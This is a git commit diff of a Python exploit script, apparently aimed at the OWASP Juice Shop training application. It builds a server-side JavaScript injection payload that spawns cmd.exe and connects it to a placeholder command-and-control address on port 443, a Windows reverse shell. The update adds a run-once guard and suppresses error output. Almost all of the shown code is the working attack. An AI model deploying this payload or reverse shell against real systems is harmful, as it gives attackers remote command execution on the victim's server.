1c175f59e4487883593b3d0159dbad8cf9e3471b
LV6 <63260147+LV6LV@users.noreply.github.com>
2024-07-17 22:56:27 -0500

    Update juiceshop_rce_win.py

--- python_scripts/juiceshop_rce_win.py
+++ python_scripts/juiceshop_rce_win.py
@@ -4,23 +4,35 @@ import requests
 import logging
 import urllib
 
-HOST = 'http://localhost:3000'
+HOST = 'http://<host>:3000'
 
 command = """
-var require = this.process.mainModule.require;
-var net = require('net');
-var cmdPath = process.env.COMSPEC || 'cmd.exe'; // Fallback to 'cmd.exe' if COMSPEC is undefined
-var sh = require('child_process').spawn(cmdPath, [], {});
-sh.on('error', function(err) {
-    console.error(err);
-});
+if (typeof global.hasRun === 'undefined' || global.hasRun === false) {
+    global.hasRun = true;
+    var require = this.process.mainModule.require;
+    var net = require('net');
+    var cmdPath = process.env.COMSPEC || 'cmd.exe';
+    var sh = require('child_process').spawn(cmdPath, [], {});
+    sh.on('error', function(err) {
+        // Optionally, handle the error silently or log it in a different way
+    });
 
-var client = new net.Socket();
-client.connect(443, "<YOUR_CC_SERVER_IP_ADDRESS>", function(){
-    client.pipe(sh.stdin);
-    sh.stdout.pipe(client);
-    sh.stderr.pipe(client);
-});
+    sh.on('exit', function() {
+        global.hasRun = false; // Reset hasRun when the process exits
+    });
+
+    var client = new net.Socket();
+    client.on('error', function(err) {
+        // Suppress the error logging
+        global.hasRun = false; // Reset hasRun if connection fails
+    });
+
+    client.connect(443, "<YOUR_CC_SERVER_IP_ADDRESS>", function() {
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+}
 """
 
 payload = f"' || (function() {{ {command} }})(); //"
